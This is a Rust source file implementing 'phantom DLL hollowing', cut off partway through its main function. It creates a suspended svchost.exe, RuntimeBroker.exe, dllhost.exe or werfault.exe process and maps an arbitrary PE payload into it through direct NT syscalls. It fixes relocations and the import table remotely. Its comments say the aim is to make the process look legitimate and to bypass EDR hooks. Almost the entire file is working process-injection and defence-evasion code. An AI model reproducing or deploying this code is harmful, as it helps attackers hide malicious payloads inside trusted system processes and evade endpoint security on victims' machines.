//! Phantom DLL hollowing: inject a DLL into a legitimate host process without
//! writing to disk and without calling VirtualAlloc/VirtualAllocEx.
//!
//! The technique works in four phases:
//!
//! 1. **Section creation** — `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)`
//!    + `NtMapViewOfSection` into the **calling** process to write the DLL bytes,
//!    then `NtProtectVirtualMemory` to RX.
//!
//! 2. **Host process creation** — `CreateProcessW` with `CREATE_SUSPENDED` using a
//!    legitimate system binary (svchost.exe, RuntimeBroker.exe, dllhost.exe).
//!
//! 3. **Image replacement** — `NtUnmapViewOfSection` the host's original image,
//!    then `NtMapViewOfSection` the phantom section into the host process at the
//!    original image base.  Fix base relocations, rebuild IAT, update
//!    `PEB.ImageBaseAddress`.
//!
//! 4. **Execution** — Set thread `CONTEXT.Rip` to the payload entry point and
//!    `NtResumeThread`.
//!
//! The resulting process appears completely legitimate: the host binary exists
//! on disk, the PEB is consistent, and no `VirtualAlloc`/`VirtualAllocEx` was
//! ever called.  Section-based memory management bypasses EDR hooks that
//! monitor the classic RW→RX allocation triad.
//!
//! # Constraints
//!
//! - Windows x86_64 only.
//! - Requires `direct-syscalls` feature for indirect syscall infrastructure.
//! - Payload must be a valid PE64 image with a relocation table.

#![cfg(all(windows, feature = "phantom-dll-hollow", target_arch = "x86_64"))]

use anyhow::{anyhow, Result};
use winapi::ctypes::c_void;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
    IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE,
    IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    PAGE_READONLY, PAGE_READWRITE, SEC_COMMIT,
};

// ── NT constants (not exported by winapi) ────────────────────────────────────

const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const NT_THREAD_INJECT_ACCESS: u32 = 0x1A02;
const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
const NT_CURRENT_PROCESS: usize = usize::MAX;
const NT_OBJ_CASE_INSENSITIVE: u32 = 0x40;
const NT_FILE_READ_DATA: u32 = 0x0001;
const NT_FILE_EXECUTE: u32 = 0x0020;
const NT_SYNCHRONIZE: u32 = 0x0010_0000;
const NT_FILE_SHARE_READ: u32 = 0x0001;
const NT_FILE_SHARE_DELETE: u32 = 0x0004;
const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
const NT_SEC_IMAGE: u32 = 0x0100_0000;

// ── Result type ──────────────────────────────────────────────────────────────

/// Result of a successful phantom DLL hollowing operation.
pub struct PhantomHollowResult {
    /// Handle to the created host process. Caller must close this handle.
    pub process_handle: *mut c_void,
    /// Handle to the main thread. Caller must close this handle.
    pub thread_handle: *mut c_void,
    /// Base address where the phantom DLL was mapped in the host process.
    pub phantom_base: usize,
}

// ── Helper: NtObjectAttributes ───────────────────────────────────────────────

#[repr(C)]
struct NtObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut winapi::shared::ntdef::UNICODE_STRING,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    pointer: usize,
    information: usize,
}

// ── Host candidate paths ─────────────────────────────────────────────────────

/// Return a list of legitimate system executables suitable as phantom hollowing
/// hosts.  The process will appear as one of these binaries after hollowing.
fn host_candidate_paths() -> Vec<String> {
    let sys_dir = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys32 = format!(r"{}\System32", sys_dir);
    [
        format!(r"{}\svchost.exe", sys32),
        format!(r"{}\RuntimeBroker.exe", sys32),
        format!(r"{}\dllhost.exe", sys32),
        format!(r"{}\werfault.exe", sys32),
    ]
    .to_vec()
}

// ── DOS path to NT path ─────────────────────────────────────────────────────

/// Convert a DOS path (e.g. `C:\Windows\System32\svchost.exe`) to an NT
/// namespace path (`\??\C:\Windows\System32\svchost.exe`) encoded as a
/// NUL-terminated UTF-16 vector.
fn dos_to_nt_path(dos_path: &str) -> Vec<u16> {
    let nt_path = if dos_path.starts_with(r"\??\") {
        dos_path.to_string()
    } else {
        format!(r"\??\{}", dos_path)
    };
    let mut wide: Vec<u16> = nt_path.encode_utf16().collect();
    wide.push(0);
    wide
}

// ── Resolve ntdll export ────────────────────────────────────────────────────

/// Resolve an ntdll export by name via PEB walk (no IAT hook).
unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(name);
    pe_resolve::get_proc_address_by_hash(ntdll, hash).map(|a| a as usize)
}

// ── Handle cleanup macro ─────────────────────────────────────────────────────

macro_rules! close_handle {
    ($h:expr) => {
        let _ = crate::syscall!("NtClose", $h as u64);
    };
}

// ── Create suspended host process via NtCreateProcessEx ─────────────────────

/// Create a suspended host process using NT direct syscalls.
///
/// Opens the host executable via `NtOpenFile`, creates a section with
/// `SEC_IMAGE`, creates a process from that section via `NtCreateProcessEx`,
/// then creates the initial thread suspended via `NtCreateThreadEx`.
///
/// Returns `(h_process, h_thread)`.
unsafe fn create_suspended_process_nt(
    exe_path: &str,
) -> Result<(*mut c_void, *mut c_void)> {
    // Build NT namespace path and UNICODE_STRING.
    let mut path_wide = dos_to_nt_path(exe_path);
    let byte_len = ((path_wide.len() - 1) * 2) as u16;
    let mut ustr = winapi::shared::ntdef::UNICODE_STRING {
        Length: byte_len,
        MaximumLength: byte_len + 2,
        Buffer: path_wide.as_mut_ptr(),
    };
    let mut oa = NtObjectAttributes {
        length: std::mem::size_of::<NtObjectAttributes>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: &mut ustr,
        attributes: NT_OBJ_CASE_INSENSITIVE,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };
    let mut isb = IoStatusBlock {
        pointer: 0,
        information: 0,
    };

    let mut h_file: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtOpenFile",
        &mut h_file as *mut _ as u64,
        (NT_FILE_READ_DATA | NT_FILE_EXECUTE | NT_SYNCHRONIZE) as u64,
        &mut oa as *mut _ as u64,
        &mut isb as *mut _ as u64,
        (NT_FILE_SHARE_READ | NT_FILE_SHARE_DELETE) as u64,
        (NT_FILE_SYNC_IO_NONALERT | NT_FILE_NON_DIRECTORY) as u64,
    )
    .map_err(|e| anyhow!("NtOpenFile SSN: {e}"))?;
    if s < 0 || h_file.is_null() {
        return Err(anyhow!(
            "NtOpenFile({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Create a section backed by the host executable (SEC_IMAGE).
    let mut h_section: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,
        0u64,
        PAGE_EXECUTE_READ as u64,
        NT_SEC_IMAGE as u64,
        h_file as u64,
    )
    .map_err(|e| anyhow!("NtCreateSection(SEC_IMAGE) SSN: {e}"))?;
    close_handle!(h_file);
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "NtCreateSection(SEC_IMAGE, {}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Create the child process from the section.
    let mut h_process: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateProcessEx",
        &mut h_process as *mut _ as u64,
        NT_PROCESS_ALL_ACCESS as u64,
        0u64,
        NT_CURRENT_PROCESS as u64,
        0u64,
        h_section as u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateProcessEx SSN: {e}"))?;
    close_handle!(h_section);
    if s < 0 || h_process.is_null() {
        return Err(anyhow!(
            "NtCreateProcessEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Resolve a suitable thread start routine inside ntdll.
    let start_addr = resolve_nt(b"RtlUserThreadStart\0")
        .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
        .ok_or_else(|| anyhow!("RtlUserThreadStart not found in ntdll"))?;

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_INJECT_ACCESS as u64,
        0u64,
        h_process as u64,
        start_addr as u64,
        0u64,
        NT_THREAD_SUSPENDED as u64,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
    if s < 0 || h_thread.is_null() {
        let _ = crate::syscall!("NtTerminateProcess", h_process as u64, 1u64);
        close_handle!(h_process);
        return Err(anyhow!(
            "NtCreateThreadEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    Ok((h_process, h_thread))
}

// ── Read remote memory helper ────────────────────────────────────────────────

/// Read exactly `len` bytes from a remote process.
/// Returns `true` on success.
unsafe fn nt_read_exact(
    h_process: *mut c_void,
    remote_addr: usize,
    buf: *mut c_void,
    len: usize,
) -> bool {
    let mut read_bytes: usize = 0;
    let s = crate::syscall!(
        "NtReadVirtualMemory",
        h_process as u64,
        remote_addr as u64,
        buf as u64,
        len as u64,
        &mut read_bytes as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 && read_bytes == len => true,
        _ => false,
    }
}

/// Write exactly `len` bytes into a remote process.
/// Returns `true` on success.
unsafe fn nt_write_exact(
    h_process: *mut c_void,
    remote_addr: usize,
    buf: *const c_void,
    len: usize,
) -> bool {
    let mut written: usize = 0;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_process as u64,
        remote_addr as u64,
        buf as u64,
        len as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 && written == len => true,
        _ => false,
    }
}

// ── Apply relocations remotely ───────────────────────────────────────────────

/// Apply base relocations to the PE image mapped in the remote process.
unsafe fn apply_relocations_remote(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Err(anyhow!(
            "phantom_dll_hollow: PE has no relocation directory, cannot rebased"
        ));
    }

    let reloc_rva = reloc_dir.VirtualAddress as usize;
    let reloc_size = reloc_dir.Size as usize;
    let reloc_offset = rva_to_file_offset(payload, reloc_rva);
    let reloc_end = reloc_offset.saturating_add(reloc_size);

    if reloc_end > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow: relocation directory extends beyond payload"
        ));
    }

    let mut offset = reloc_offset;
    while offset + 8 <= reloc_end {
        // Read the block header from the local payload copy.
        let block_rva =
            u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;

        if block_size == 0 || block_size < 8 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end {
                break;
            }
            let entry = u16::from_le_bytes(
                payload[entry_off..entry_off + 2].try_into().unwrap(),
            );
            let typ = (entry >> 12) & 0xF;
            let off = (entry & 0x0FFF) as usize;

            // IMAGE_REL_BASED_DIR64 = 10 (x86_64)
            if typ == 10 {
                let target_rva = block_rva + off;
                let mut val: u64 = 0;
                if !nt_read_exact(
                    h_process,
                    remote_base + target_rva,
                    &mut val as *mut _ as *mut c_void,
                    8,
                ) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to read reloc target at RVA {:#x}",
                        target_rva
                    );
                    continue;
                }
                val = (val as isize + delta) as u64;
                if !nt_write_exact(
                    h_process,
                    remote_base + target_rva,
                    &val as *const _ as *const c_void,
                    8,
                ) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to write reloc fixup at RVA {:#x}",
                        target_rva
                    );
                }
            }
        }

        offset += block_size;
    }

    Ok(())
}

// ── Resolve export by ordinal ───────────────────────────────────────────────

/// Resolve a function from a loaded DLL by ordinal, by walking the export
/// directory directly.  The ordinal is a base-1 index; the export directory's
/// `Base` field specifies the first valid ordinal number.
unsafe fn resolve_export_by_ordinal(dll_base: usize, ordinal: usize) -> Option<usize> {
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }
    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    let signature = *(nt_headers as *const u32);
    if signature != 0x4550 {
        return None;
    }
    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }
    let export_dir = dll_base + export_dir_rva;
    let base = *((export_dir + 0x10) as *const u32) as usize;
    let num_funcs = *((export_dir + 0x14) as *const u32) as usize;
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;

    let index = ordinal.saturating_sub(base);
    if index >= num_funcs {
        return None;
    }
    let func_rva = *((dll_base + rva_funcs + index * 4) as *const u32) as usize;
    if func_rva == 0 {
        return None;
    }
    // Check for forwarder.
    if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
        // Forwarded export — skip (complex to resolve here).
        return None;
    }
    Some(dll_base + func_rva)
}

// ── Fix IAT remotely ────────────────────────────────────────────────────────

/// Walk the import descriptor table, resolve each DLL + function, and patch
/// the Import Address Table in the remote process.
unsafe fn fix_iat_remote(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
    payload: &[u8],
) -> Result<()> {
    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 || import_dir.Size == 0 {
        // No imports — nothing to do.
        return Ok(());
    }

    let import_rva = import_dir.VirtualAddress as usize;
    let desc_size = std::mem::size_of::<winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR>();

    let mut desc_idx = 0;
    loop {
        let desc_offset = rva_to_file_offset(payload, import_rva + desc_idx * desc_size);
        if desc_offset + desc_size > payload.len() {
            break;
        }

        // Read descriptor fields from the local payload.
        let ilt_rva =
            u32::from_le_bytes(payload[desc_offset..desc_offset + 4].try_into().unwrap());
        let _timestamp =
            u32::from_le_bytes(payload[desc_offset + 4..desc_offset + 8].try_into().unwrap());
        let _forwarder =
            u32::from_le_bytes(payload[desc_offset + 8..desc_offset + 12].try_into().unwrap());
        let name_rva =
            u32::from_le_bytes(payload[desc_offset + 12..desc_offset + 16].try_into().unwrap());
        let iat_rva =
            u32::from_le_bytes(payload[desc_offset + 16..desc_offset + 20].try_into().unwrap());

        // Terminating descriptor: all zeros.
        if ilt_rva == 0 && name_rva == 0 && iat_rva == 0 {
            break;
        }

        if name_rva == 0 || iat_rva == 0 {
            desc_idx += 1;
            continue;
        }

        // Read DLL name from the local payload.
        let name_offset = rva_to_file_offset(payload, name_rva as usize);
        let name_end = payload[name_offset..]
            .iter()
            .position(|&b| b == 0)
            .map(|p| name_offset + p)
            .unwrap_or(payload.len());
        if name_offset >= payload.len() || name_end >= payload.len() {
            desc_idx += 1;
            continue;
        }
        let dll_name =
            std::ffi::CStr::from_bytes_with_nul(&payload[name_offset..=name_end]).unwrap_or_else(|_| {
                desc_idx += 1;
                std::ffi::CStr::from_bytes_with_nul(b"?\0").unwrap()
            });

        // Resolve DLL via PEB walk.
        let dll_hash = pe_resolve::hash_str(dll_name.to_bytes_with_nul());
        let dll_base = match pe_resolve::get_module_handle_by_hash(dll_hash) {
            Some(b) => b,
            None => {
                // Try to map a clean copy of the DLL.
                let dll_name_str = dll_name.to_string_lossy();
                tracing::debug!(
                    "phantom_dll_hollow: DLL {} not found via PEB walk, attempting clean map",
                    dll_name_str
                );
                match crate::syscalls::map_clean_dll(&dll_name_str) {
                    Ok(b) => b,
                    Err(_) => {
                        tracing::warn!(
                            "phantom_dll_hollow: could not resolve DLL {}",
                            dll_name_str
                        );
                        desc_idx += 1;
                        continue;
                    }
                }
            }
        };

        // Walk the Import Lookup Table (or IAT if ILT is zero) to resolve
        // each imported function.
        let lookup_rva = if ilt_rva != 0 { ilt_rva } else { iat_rva };
        let mut thunks_remaining = true;
        let mut thunk_idx = 0u32;
        while thunks_remaining {
            let thunk_offset =
                rva_to_file_offset(payload, lookup_rva as usize + thunk_idx as usize * 8);
            if thunk_offset + 8 > payload.len() {
                break;
            }
            let thunk_val = u64::from_le_bytes(
                payload[thunk_offset..thunk_offset + 8].try_into().unwrap(),
            );

            // Terminating entry.
            if thunk_val == 0 {
                thunks_remaining = false;
                break;
            }

            let func_addr = if thunk_val & (1u64 << 63) != 0 {
                // Import by ordinal — resolve by walking the export table.
                let ordinal = (thunk_val & 0xFFFF) as usize;
                resolve_export_by_ordinal(dll_base, ordinal)
            } else {
                // Import by name hint.
                let hint_rva = (thunk_val & 0x7FFFFFFF) as usize;
                let hint_offset = rva_to_file_offset(payload, hint_rva);
                // Hint is u16, then NUL-terminated name.
                if hint_offset + 2 >= payload.len() {
                    thunk_idx += 1;
                    continue;
                }
                let name_start = hint_offset + 2;
                let name_end_local = payload[name_start..]
                    .iter()
                    .position(|&b| b == 0)
                    .map(|p| name_start + p)
                    .unwrap_or(payload.len().saturating_sub(1));
                if name_start >= payload.len() || name_end_local >= payload.len() {
                    thunk_idx += 1;
                    continue;
                }
                let func_name = &payload[name_start..=name_end_local];
                let func_hash = pe_resolve::hash_str(func_name);
                pe_resolve::get_proc_address_by_hash(dll_base, func_hash).map(|a| a as usize)
            };

            if let Some(addr) = func_addr {
                // Patch the IAT entry in the remote process.
                let iat_slot = remote_base + iat_rva as usize + thunk_idx as usize * 8;
                if !nt_write_exact(
                    h_process,
                    iat_slot,
                    &addr as *const _ as *const c_void,
                    8,
                ) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to write IAT slot at {:#x}",
                        iat_slot
                    );
                }
            } else {
                tracing::warn!(
                    "phantom_dll_hollow: failed to resolve import #{} from {}",
                    thunk_idx,
                    dll_name.to_string_lossy()
                );
            }

            thunk_idx += 1;
        }

        desc_idx += 1;
    }

    Ok(())
}

// ── Apply per-section protections ────────────────────────────────────────────

/// Walk PE sections and apply appropriate memory protections (e.g. .text → RX,
/// .rdata → R, .data → RW) in the remote process.
unsafe fn apply_section_protections(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
) {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;

    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let sec_va = sec.VirtualAddress as usize;
        let sec_vs = *sec.Misc.VirtualSize() as usize;
        if sec_va == 0 || sec_vs == 0 {
            continue;
        }

        // Determine target protection from section characteristics.
        let is_exec = sec.Characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0;
        let is_write = sec.Characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0;

        let target_prot = if is_exec && is_write {
            PAGE_EXECUTE_READWRITE
        } else if is_exec {
            PAGE_EXECUTE_READ
        } else if is_write {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let mut base = remote_base + sec_va;
        let mut size = sec_vs;
        let mut old_prot = 0u32;

        let s = crate::syscall!(
            "NtProtectVirtualMemory",
            h_process as u64,
            &mut base as *mut _ as u64,
            &mut size as *mut _ as u64,
            target_prot as u64,
            &mut old_prot as *mut _ as u64,
        );
        if let Ok(st) = s {
            if st < 0 {
                tracing::debug!(
                    "phantom_dll_hollow: NtProtectVirtualMemory(section {i}) NTSTATUS {:#010x}",
                    st as u32
                );
            }
        }
    }
}

// ── RVA to file offset ──────────────────────────────────────────────────────

/// Convert a Relative Virtual Address to a raw file offset using the PE
/// section table from `payload`.
fn rva_to_file_offset(payload: &[u8], rva: usize) -> usize {
    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return rva;
    }
    let e_lfanew = match (payload.len() > 0x3c).then(|| {
        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize
    }) {
        Some(v) => v,
        None => return rva,
    };
    if e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() > payload.len() {
        return rva;
    }
    let num_sections =
        u16::from_le_bytes(payload[e_lfanew + 6..e_lfanew + 8].try_into().unwrap_or([0, 0]));
    let size_of_opt_header = unsafe {
        (payload.as_ptr().add(e_lfanew + 4 + 16) as *const u16).read_unaligned()
    } as usize;
    let sections_offset = e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>()
        + size_of_opt_header;

    for i in 0..num_sections as usize {
        let off = sections_offset + i * std::mem::size_of::<IMAGE_SECTION_HEADER>();
        if off + std::mem::size_of::<IMAGE_SECTION_HEADER>() > payload.len() {
            break;
        }
        let va = u32::from_le_bytes(payload[off + 12..off + 16].try_into().unwrap_or([0; 4]))
            as usize;
        let vs = u32::from_le_bytes(payload[off + 8..off + 12].try_into().unwrap_or([0; 4]))
            as usize;
        let raw = u32::from_le_bytes(payload[off + 20..off + 24].try_into().unwrap_or([0; 4]))
            as usize;

        if rva >= va && rva < va + vs {
            return rva - va + raw;
        }
    }
    // Header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

// ── Main entry point ────────────────────────────────────────────────────────

/// Phantom DLL hollowing: inject a DLL into a host process using exclusively
/// section-based memory management (no VirtualAlloc / VirtualAllocEx).
///
/// # Arguments
///
/// * `payload` — PE64 image bytes to inject (must be a valid PE with
///   relocation table).
///
/// # Returns
///
/// `Ok(PhantomHollowResult)` on success with handles to the host process/thread
/// and the base address of the mapped phantom DLL.
///
/// # Safety
///
/// This function performs direct NT syscalls and manipulates process memory.
/// The caller is responsible for closing the returned handles.
pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> {
    // ── Validate payload ─────────────────────────────────────────────────
    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "phantom_dll_hollow: payload is not a PE (no MZ header)"
        ));
    }

    let e_lfanew =
        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize;
    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow: NT headers extend beyond payload"
        ));
    }

    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("phantom_dll_hollow: invalid NT signature"));
    }
    if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        return Err(anyhow!(
            "phantom_dll_hollow: only PE64 payloads are supported"
        ));
    }

    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

    // Ensure SSN infrastructure is initialised.
    let _ = nt_syscall::init_syscall_infrastructure();

    // ── Phase 1: Create phantom section + map into calling process ───────
    //
    // We create a SEC_COMMIT section with PAGE_EXECUTE_READWRITE, map it into
    // our own process (PAGE_READWRITE) to write the DLL bytes, then flip the
    // local view to PAGE_EXECUTE_READ.  The section handle is kept so we can
    // map it into the host process in Phase 3.

    let mut h_section: *mut c_void = std::ptr::null_mut();
    // Create a section large enough for the entire PE image.
    // We use SEC_COMMIT so the section is backed by the page file (no file needed).
    let mut section_size: i64 = image_size as i64;
    let s = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,                                        // no object attributes
        &mut section_size as *mut _ as u64,          // maximum size
        PAGE_EXECUTE_READWRITE as u64,               // section page protection
        SEC_COMMIT as u64,                           // allocation attributes (no file)
        0u64,                                        // no file handle
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtCreateSection SSN: {e}"))?;
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "phantom_dll_hollow: NtCreateSection NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Map the section into our own process for writing the DLL bytes.
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;
    let s = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        NT_CURRENT_PROCESS as u64,                   // into our process
        &mut local_base as *mut _ as u64,
        0u64,                                        // zero bits
        0u64,                                        // commit size
        std::ptr::null_mut::<u64>() as u64,            // section offset (NULL = start)
        &mut view_size as *mut _ as u64,
        1u64,                                        // ViewUnmap = 1 (not inherited)
        0u64,                                        // allocation type
        PAGE_READWRITE as u64,                       // protection for local view
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtMapViewOfSection(local) SSN: {e}"))?;
    if s < 0 || local_base.is_null() {
        close_handle!(h_section);
        return Err(anyhow!(
            "phantom_dll_hollow: NtMapViewOfSection(local) NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Write the PE image into the local mapping.
    // First zero the entire mapping (sections with no raw data need zero fill).
    std::ptr::write_bytes(local_base as *mut u8, 0, view_size);

    // Copy headers.
    let headers_size = (*nt).OptionalHeader.SizeOfHeaders as usize;
    if headers_size > payload.len() || headers_size > view_size {
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: SizeOfHeaders exceeds payload or view"
        ));
    }
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, headers_size);

    // Copy each section from file offsets to virtual addresses.
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let raw_off = sec.PointerToRawData as usize;
        let raw_sz = sec.SizeOfRawData as usize;
        let va = sec.VirtualAddress as usize;
        let vs = *sec.Misc.VirtualSize() as usize;
        if raw_off == 0 || raw_sz == 0 || raw_off + raw_sz > payload.len() {
            continue;
        }
        let copy_sz = raw_sz.min(vs).min(view_size.saturating_sub(va));
        if va + copy_sz > view_size {
            continue;
        }
        let dst = (local_base as usize + va) as *mut u8;
        std::ptr::copy_nonoverlapping(payload.as_ptr().add(raw_off), dst, copy_sz);
    }

    // Flush the local mapping (ensure writes are visible before remote map).
    let mut old_prot = 0u32;
    let mut prot_base = local_base as usize;
    let mut prot_size = view_size;
    let _ = crate::syscall!(
        "NtProtectVirtualMemory",
        NT_CURRENT_PROCESS as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );

    // ── Phase 2: Create suspended host process ───────────────────────────
    //
    // Try multiple host candidates; fall through on failure.
    let (h_process, h_thread, _host_path) = {
        let mut result: Result<(*mut c_void, *mut c_void)> = Err(anyhow!(
            "phantom_dll_hollow: all host candidates failed"
        ));
        let mut chosen_path = String::new();
        for path in host_candidate_paths() {
            match create_suspended_process_nt(&path) {
                Ok(handles) => {
                    chosen_path = path;
                    result = Ok(handles);
                    break;
                }
                Err(e) => {
                    tracing::debug!("phantom_dll_hollow: candidate {} failed: {}", path, e)
                }
            }
        }
        result.map(|(a, b)| (a, b, chosen_path))?
    };

    macro_rules! terminate_and_cleanup {
        () => {{
            let _ = crate::syscall!("NtTerminateProcess", h_process as u64, 1u64);
            close_handle!(h_thread);
            close_handle!(h_process);
        }};
    }

    // ── Phase 3: Replace host image with phantom section ─────────────────
    //
    // Read the host's PEB.ImageBaseAddress, unmap the original image, then
    // map the phantom section into the host at the original base.

    // Get PEB address via NtQueryInformationProcess.
    let mut pbi = [0u8; 48];
    let mut ret_len: u32 = 0;
    let s = crate::syscall!(
        "NtQueryInformationProcess",
        h_process as u64,
        0u64, // ProcessBasicInformation
        pbi.as_mut_ptr() as u64,
        48u64,
        &mut ret_len as *mut _ as u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtQueryInformationProcess SSN: {e}"))?;
    if s < 0 || ret_len < 16 {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: NtQueryInformationProcess NTSTATUS {:#010x}",
            s as u32
        ));
    }
    let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
    if peb_addr == 0 {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!("phantom_dll_hollow: PEB address is NULL"));
    }
    let peb_ptr = peb_addr as *const u8;

    // Read PEB.ImageBaseAddress (offset 0x10).
    let mut remote_image_base: usize = 0;
    if !nt_read_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &mut remote_image_base as *mut _ as *mut c_void,
